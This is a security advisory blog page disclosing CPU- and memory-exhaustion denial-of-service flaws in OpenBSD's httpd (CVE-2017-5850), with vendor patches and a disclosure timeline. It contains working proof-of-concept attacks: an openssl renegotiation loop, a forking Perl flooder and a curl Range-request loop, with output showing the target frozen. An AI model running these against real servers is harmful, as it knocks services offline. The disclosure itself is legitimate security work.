<!DOCTYPE html>
<html>
<head>
<title>CVE-2017-5850 - Remote DoS against OpenBSD http server (up to 6.0) - IT Security Research by Pierre</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="css/bootstrap.min.css" rel="stylesheet">
<link href="feed.xml" rel="alternate" type="application/rss+xml" title="Blog" />
<style>
body {
    font-family: sans-serif;
    background-color: #fff;
    font-size: 16px;
}
h1, h2, h3, h4 {
    font-family: arial;
}
.container {
    max-width: 900px;
}
.footer {
    margin-top: 50px;
    font-size: 12px;
    text-align: center;
}
</style>
</head>
<body>
<div class="container">
    <div class="hero-unit faq">
        <div class="ac" style="text-align: center;">
            <h1>IT Security Research by Pierre</h1>
            <a href="../index.html">Home</a> &bull; <a href="about.html">About</a>  &bull; <a href="feed.xml">Feed</a>
        </div>
    </div>
    
<div class="hero-unit faq">
    <div class="ac">
        <h2>CVE-2017-5850 - Remote DoS against OpenBSD http server (up to 6.0)</h2>
    </div>
</div>

<div>
    <h2>Product Description</h2>
<p>The OpenBSD project produces a FREE, multi-platform 4.4BSD-based UNIX-like operating system.</p>
<h2>Vulnerabilities Summary</h2>
<p>The shipped HTTP daemon in OpenBSD (up to the latest version) is prone to 2 remote DoS.</p>
<p>The first vulnerability allows an attacker to consume all the CPU power from the remote server (CPU exhaustion).</p>
<p>The second vulnerability (Memory exhaustion) allows an attacker to consume all the RAM and the swap space on the remote side.
Processes will be killed when running out of swap space. The system will be likely to freeze.</p>
<h2>Details - CPU exhaustion (no CVE entry)</h2>
<p>OpenBSD's httpd is prone to a SSL DoS with SSL renegotiation:</p>
<pre><code>user@kali:~$ (sleep 1; while true;do echo R;done) | openssl s_client -connect 10.0.2.15:443
CONNECTED(00000003)
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify error:num=18:self signed certificate
verify return:1
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify return:1
---
Certificate chain
 0 s:/C=XX/ST=secure.example.com/CN=secure.example.com
   i:/C=XX/ST=secure.example.com/CN=secure.example.com
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIDCjCCAfICCQC0tQxJqUqQTzANBgkqhkiG9w0BAQsFADBHMQswCQYDVQQGEwJY
WDEbMBkGA1UECAwSc2VjdXJlLmV4YW1wbGUuY29tMRswGQYDVQQDDBJzZWN1cmUu
ZXhhbXBsZS5jb20wHhcNMTcwMTI3MTU0MjMzWhcNMTgwMTI3MTU0MjMzWjBHMQsw
CQYDVQQGEwJYWDEbMBkGA1UECAwSc2VjdXJlLmV4YW1wbGUuY29tMRswGQYDVQQD
DBJzZWN1cmUuZXhhbXBsZS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
AoIBAQCjIY7mMaNVLmPDA4ir59mgdQEM4TFTgz5cv9SqU4hQq0eVmpJkEfJPHErF
to5NdF2ZIqhL+F34GqZcCC8qO3xB33dAevENWWbA4KObpIybHr8bFeDYYl5GuaCO
hizmcffU3P1ztRNXB4sCTTQwkyry8ZUDaeINLGMb0HhFR9u5TJY6tSB0KMIuiBsH
1hEp8bNxUM046D0wkZkyIgM/or6uj5jRj33aYUn6ZiU8a6UKSAVZJLqziyNcQ0hA
64gS6oapUnMVYJIUDJynOhY5e8xZmD+2pB4NLTIxAEdSyQ4wQ4jBiRFVL+E68fuw
kASmrA4gAbSCO+lYBO8wCRiVOwOdAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAC1L
213ziHqFmC8nLWvvjyoHY2PRFS1ofrfciv+fpohn2GN+eVb8DGTo+KLZ910/PUPk
dzTa7eOlkvR1OG7BUlnia6pGQqizTodvzx0DGgl76k4VpEvJAOZ4f7Plry4qgr5Y
y3Fwym1k3DlNJ5Jqh8Vp2HETbqcovATsUHRS5t/oc6N2egq1DYVC5CdGRgvmmUl+
NBjKOASYoP8S4OQ51wMmXrygFqKcEkq4/GTUFEaamrbM/J+ChD9EqejSKzZ5owRh
74v10s30OylBdmfOLeyrMv5s6DnJRAdtFEH9Wg7sQDt1P3bGOsObVZlmHCtArl4k
m1nHRn8scAFP7QbHl34=
-----END CERTIFICATE-----
subject=/C=XX/ST=secure.example.com/CN=secure.example.com
issuer=/C=XX/ST=secure.example.com/CN=secure.example.com
---
No client certificate CA names sent
---
SSL handshake has read 1548 bytes and written 503 bytes
---
New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: DA628A16EF4F067ED81E7A26EFA18D9A7D53CBC4ED54C8F6DC11E5E60FF76530
    Session-ID-ctx: 
    Master-Key: 9235AFEBCF2A517E896A06CAA7A1AF916646DB5BB4C99B53A79627351C0FFB936EB863B0E50A67DF70A354773CF049BE
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - 49 f1 29 da 9e 08 f2 74-c6 f3 eb a1 c7 ee 40 bb   I.)....t......@.
    0010 - 96 75 54 c8 4f 32 53 7e-51 40 4e a8 e9 57 41 a5   .uT.O2S~Q@N..WA.
    0020 - 73 3d a9 d6 b8 f7 a0 f8-15 cb be fb f1 4d d9 81   s=...........M..
    0030 - a8 79 56 11 5d 05 32 05-49 df 2b f3 71 89 36 a1   .yV.].2.I.+.q.6.
    0040 - 93 dc b9 b5 00 48 6f 94-b1 c5 78 f8 38 3c 63 29   .....Ho...x.8&lt;c)
    0050 - ed 45 a2 9e ae fc 7e d7-12 76 34 15 93 b1 3d 3d   .E....~..v4...==
    0060 - d7 0a 14 f1 01 a7 87 6c-50 93 25 24 5e 4f 1b fa   .......lP.%$^O..
    0070 - 51 03 4b fa 7e 23 83 99-51 f6 47 10 8c d1 0e 41   Q.K.~#..Q.G....A
    0080 - 5a f7 a5 10 33 a7 37 5d-9b 5e b0 b6 19 e7 e2 61   Z...3.7].^.....a
    0090 - ec ea 1c 72 3c 4a ec 11-0f 26 35 76 6e d9 cb 4d   ...r&lt;J...&amp;5vn..M
    00a0 - c7 f8 57 cb 50 f6 47 02-6b ca be cc 29 04 b7 dc   ..W.P.G.k...)...
    00b0 - e0 d1 cc 8e 5b f9 05 06-10 72 d7 b6 8e cf 42 6a   ....[....r....Bj

    Start Time: 1485536662
    Timeout   : 300 (sec)
    Verify return code: 18 (self signed certificate)
---
RENEGOTIATING
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify error:num=18:self signed certificate
verify return:1
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify return:1
RENEGOTIATING
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify error:num=18:self signed certificate
verify return:1
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify return:1
RENEGOTIATING
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify error:num=18:self signed certificate
verify return:1
depth=0 C = XX, ST = secure.example.com, CN = secure.example.com
verify return:1
RENEGOTIATING
[...]
</code></pre>
<p>From my test, 1 renegociation thread takes =~ 70% of CPU.</p>
<p>top on the main server (10.0.2.15):</p>
<pre><code>14711 www       51    0 1104K 3636K run       -         1:07 69.55% httpd
</code></pre>
<p>Multiple threads will eat all the available CPUs and will be likely to DoS the httpd:</p>
<pre><code>14711 www       63    0 1192K 3708K run       -         2:48 33.45% httpd
77207 www       63    0 1284K 3788K run       -         1:33 33.06% httpd
78835 www       62    0 1232K 3808K run       -         0:15 28.08% httpd
</code></pre>
<p>There is no trace of such attacks in the httpd logs.</p>
<p>An attacker can use tools from THC to perform SSL DoS too (openssl was the fastest solution out of the box): <a href="https://www.thc.org/thc-ssl-dos/">https://www.thc.org/thc-ssl-dos/</a>.</p>
<h2>Details - Memory exhaustion (CVE-2017-5850)</h2>
<p>A vulnerability exists in the openbsd HTTP daemon. It will result in using all the RAM and the swap space on the remote side, processes will be killed when running out of swap space. The system will be likely to freeze.</p>
<p>Requesting file using a file-range will result in having a httpd process doing a full malloc() of the requested file.
It appears the entry is not correctly free()'d.</p>
<p>Hence, it's possible to DoS the remote server by requesting a file over and over by specifying a custom file range, ie:</p>
<pre><code>GET /index.html HTTP/1.1
Range: bytes=1-
User-Agent: Pierre loves you
Host: fill-me-with-joy
</code></pre>
<p>This attack is successful if an attacker can identify a 'big' file (i.e. &gt; 10MB) served by the remote HTTP server.</p>
<p>Here is a provided PoC (loosely based on KingCope's apache_killer.pl):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #408080; font-style: italic">#!/usr/bin/perl -w</span>

<span style="color: #008000; font-weight: bold">use</span> warnings;
<span style="color: #008000; font-weight: bold">use</span> <span style="color: #0000FF; font-weight: bold">IO::</span>Socket;
<span style="color: #008000; font-weight: bold">use</span> <span style="color: #0000FF; font-weight: bold">Parallel::</span>ForkManager;

<span style="color: #19177C">$numforks</span> <span style="color: #666666">=</span> <span style="color: #666666">50</span>;

<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$#ARGV</span> <span style="color: #666666">&lt;</span> <span style="color: #666666">1</span>)
{
  <span style="color: #666666">&amp;</span>usage;
  <span style="color: #008000">exit</span>;
}

<span style="color: #008000; font-weight: bold">while</span> (<span style="color: #666666">1</span>) {
  <span style="color: #666666">&amp;</span>killhttpd();
}

<span style="color: #008000; font-weight: bold">sub </span><span style="color: #0000FF">usage</span> {
  <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;OpenBSD HTTP Remote Denial of Service (memory exhaustion) - @PierreKimSec\n&quot;</span>;
  <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;usage: perl killobsdhttpd.pl &lt;host&gt; &lt;remotefile&gt;\n&quot;</span>;
}

<span style="color: #008000; font-weight: bold">sub </span><span style="color: #0000FF">killhttpd</span> {
  <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;ATTACKING $ARGV[0] [using $numforks forks]\n&quot;</span>;

  <span style="color: #19177C">$pm</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> <span style="color: #0000FF; font-weight: bold">Parallel::</span>ForkManager(<span style="color: #19177C">$numforks</span>);

  <span style="color: #008000; font-weight: bold">for</span> (<span style="color: #666666">0</span> <span style="color: #666666">..</span> <span style="color: #19177C">$numforks</span>)
  {
    <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">$pid</span> <span style="color: #666666">=</span> <span style="color: #19177C">$pm</span><span style="color: #666666">-&gt;</span>start <span style="color: #AA22FF; font-weight: bold">and</span> <span style="color: #008000; font-weight: bold">next</span>;
    <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">$sock</span> <span style="color: #666666">=</span> <span style="color: #0000FF; font-weight: bold">IO::Socket::</span>INET<span style="color: #666666">-&gt;</span><span style="color: #008000; font-weight: bold">new</span>(PeerAddr <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$ARGV</span>[<span style="color: #666666">0</span>],
                                     PeerPort <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&quot;80&quot;</span>,
                                     Proto    <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;tcp&#39;</span>);
    <span style="color: #19177C">$p</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;GET $ARGV[1] HTTP/1.1\r\nRange: bytes=1-\r\nAccept: */*\r\nHost: $ARGV[0]\r\nConnection: close\r\n\r\n&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #19177C">$sock</span> <span style="color: #19177C">$p</span>;
    <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #BB6688">&lt;$sock&gt;</span>) {<span style="color: #008000">sleep</span> (<span style="color: #666666">0.5</span>); <span style="color: #19177C">$sock</span><span style="color: #666666">-&gt;</span><span style="color: #008000">close</span>();}
    <span style="color: #19177C">$pm</span><span style="color: #666666">-&gt;</span>finish;
  }
  <span style="color: #19177C">$pm</span><span style="color: #666666">-&gt;</span>wait_all_children;
}
</pre></div>

<p>An attacker can use curl to replicate the PoC:</p>
<pre><code>curl --limit-rate 1 --continue-at 1 --header "Host: www.example.com" http://target/10mb.fs
</code></pre>
<p>Stopping the curl process and launching it again will produce one of the remote httpd to use more than 10MB of memory
for each request (the size of the 10mb.fs is 10MB) and will DoS the http server and the OpenBSD system by exhausting
all the RAM. The OpenBSD system will likely freeze within minutes.</p>
<p>PoC with curl (more effective than the perl version, it appears):</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #408080; font-style: italic">#!/bin/sh</span>
<span style="color: #408080; font-style: italic"># ./$0 www.target.tld /path/to/file</span>

<span style="color: #008000">unset</span> http_proxy
<span style="color: #008000">unset</span> https_proxy

<span style="color: #008000; font-weight: bold">for</span> i in <span style="color: #008000; font-weight: bold">$(</span>seq <span style="color: #666666">0</span> 300<span style="color: #008000; font-weight: bold">)</span>
<span style="color: #008000; font-weight: bold">do</span>
  <span style="color: #008000">echo</span> sending a req
  curl --limit-rate <span style="color: #666666">1</span> --continue-at <span style="color: #666666">1</span> --header <span style="color: #BA2121">&quot;Host: </span><span style="color: #19177C">$1</span><span style="color: #BA2121">&quot;</span> http://<span style="color: #19177C">$1</span>/<span style="color: #19177C">$2</span> 2&gt;/dev/null &gt;/dev/null &amp;
  sleep 0.5
  pkill curl
<span style="color: #008000; font-weight: bold">done</span>
<span style="color: #008000; font-weight: bold">while</span> sleep 1
<span style="color: #008000; font-weight: bold">do</span>
  <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;sending a req (slow)&quot;</span>
  curl --limit-rate <span style="color: #666666">1</span> --continue-at <span style="color: #666666">1</span> --header <span style="color: #BA2121">&quot;Host: </span><span style="color: #19177C">$1</span><span style="color: #BA2121">&quot;</span> http://<span style="color: #19177C">$1</span>/<span style="color: #19177C">$2</span> 2&gt;/dev/null &gt;/dev/null &amp;
  pkill curl
<span style="color: #008000; font-weight: bold">done</span>
</pre></div>

<p>This attack works using HTTP and using HTTPS.</p>
<p>Current situation in the attacked server (SWAP is full and all the RAM is being completely used):</p>
<pre><code>load averages:  7.11,  3.30,  1.38                                             foo.my.domain 10:26:41
39 processes: 6 running, 32 idle, 1 on processor                                             up  0:03
CPU states:  0.0% user,  0.0% nice,  100% system,  0.0% interrupt,  0.0% idle
Memory: Real: 569M/961M act/tot Free: 21M Cache: 49M Swap: 2039M/2040M

  PID USERNAME PRI NICE  SIZE   RES STATE     WAIT      TIME    CPU COMMAND
  48965 www       28    0 1345M  204M run       -         0:05  0.00% httpd
  43060 www       28    0 1281M  174M run       -         0:05  0.00% httpd
  91565 www       28    0 1153M  187M run       -         0:04  0.00% httpd
  63038 www        2    0  948K    4K idle      kqread    0:00  0.00% httpd
</code></pre>
<p>We see the daemons (httpd and sshd) don't answer anymore:</p>
<pre><code>user@kali:~$ 10.0.2.15 80
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is '^]'.

^]
telnet&gt; q
Connection closed.
user@kali:~$ telnet 10.0.2.15 80
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is '^]'.

^]
telnet&gt; q
Connection closed.
user@kali:~$ telnet 10.0.2.15 22
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is '^]'.

^]
telnet&gt; q
Connection closed.
Connection closed by foreign host.
</code></pre>
<h2>Vendor Response</h2>
<p>o The issue about memory exhaustion has been solved in two ways:</p>
<ul>
<li>OpenBSD 6.0/5.9: Erratas has been issued at:</li>
</ul>
<p><a href="https://ftp.openbsd.org/pub/OpenBSD/patches/6.0/common/017_httpd.patch.sig">https://ftp.openbsd.org/pub/OpenBSD/patches/6.0/common/017_httpd.patch.sig</a></p>
<p><a href="https://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/034_httpd.patch.sig">https://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/034_httpd.patch.sig</a></p>
<ul>
<li>OpenBSD -current: We reimplemented support for byte ranges in
-current.  The previous implementation was flawed indeed, as it tried
to load the complete ranges into memory at once.</li>
</ul>
<p>o High CPU usage is a well-known issue of client-initiated
renegotiation.  While this can cause higher than normal CPU usage, the
processes are still able to service requests.</p>
<p>As httpd uses LibreSSL's libtls, a sane TLS API on top of libssl, we
decided to disable client-initiated renegotiation for libtls servers
in -current.  This change was already planned and has now been
committed to LibreSSL.</p>
<ul>
<li>libssl <a href="http://marc.info/?l=openbsd-cvs&amp;m=148587695222112&amp;w=2">http://marc.info/?l=openbsd-cvs&amp;m=148587695222112&amp;w=2</a></li>
<li>libtls <a href="http://marc.info/?l=openbsd-cvs&amp;m=148587827322528&amp;w=2">http://marc.info/?l=openbsd-cvs&amp;m=148587827322528&amp;w=2</a></li>
</ul>
<h2>Report Timeline</h2>
<ul>
<li>Jan 25, 2017: Vulnerabilities found by Pierre Kim.</li>
<li>Jan 30, 2017: OpenBSD team is notified of the vulnerabilities.</li>
<li>Jan 30, 2017: OpenBSD team replies that they will study the advisory.</li>
<li>Jan 31, 2017: OpenBSD team confirms the vulnerabilities.</li>
<li>Jan 31, 2017: Pierre Kim asks for CVE entries.</li>
<li>Jan 31, 2017: OpenBSD team releases security patches.</li>
<li>Feb 01, 2017: cve-assign () mitre org assigns CVE-2017-5850 and asks for more details.</li>
<li>Feb 07, 2017: A public advisory is sent to security mailing lists.</li>
</ul>
<h2>Credit</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/blog/2017-02-07-openbsd-httpd-CVE-2017-5850.html">https://pierrekim.github.io/blog/2017-02-07-openbsd-httpd-CVE-2017-5850.html</a></p>
<p><a href="https://pierrekim.github.io/advisories/CVE-2017-5850-openbsd.txt">https://pierrekim.github.io/advisories/CVE-2017-5850-openbsd.txt</a></p>
<p><a href="https://ftp.openbsd.org/pub/OpenBSD/patches/6.0/common/017_httpd.patch.sig">https://ftp.openbsd.org/pub/OpenBSD/patches/6.0/common/017_httpd.patch.sig</a></p>
<p><a href="https://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/034_httpd.patch.sig">https://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/034_httpd.patch.sig</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p>
    <div>
        <p class="text-muted">published on 2017-02-07 00:00:00 by Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;</p>
    </div>
</div>

</div>
</body>
</html>